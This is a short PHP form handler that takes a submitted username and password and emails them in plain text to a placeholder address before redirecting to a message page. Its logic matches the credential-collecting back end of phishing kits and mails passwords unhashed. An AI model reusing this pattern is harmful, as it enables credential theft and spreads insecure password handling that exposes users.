<?php
// submit.php

if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    header("Location: index.html");
    exit;
}

$username = trim($_POST["username"] ?? "");
$password = $_POST["password"] ?? "";

if ($username === "" || $password === "") {
    $msg = urlencode("Please fill in both username and password.");
    header("Location: message.php?msg=" . $msg);
    exit;
}

$to      = "your-email@example.com";
$subject = "New Form Submission";
$body    = "Username: " . $username . "\n"
         . "Password: " . $password . "\n";

$headers = [
    "From: noreply@yourdomain.com",
    "Reply-To: noreply@yourdomain.com",
    "Content-Type: text/plain; charset=UTF-8"
];

$sent = mail($to, $subject, $body, implode("\r\n", $headers));

if ($sent) {
    $msg = urlencode("Thank you! Your submission has been sent.");
} else {
    $msg = urlencode("Submission received, but sending the email failed.");
}

header("Location: message.php?msg=" . $msg);
exit;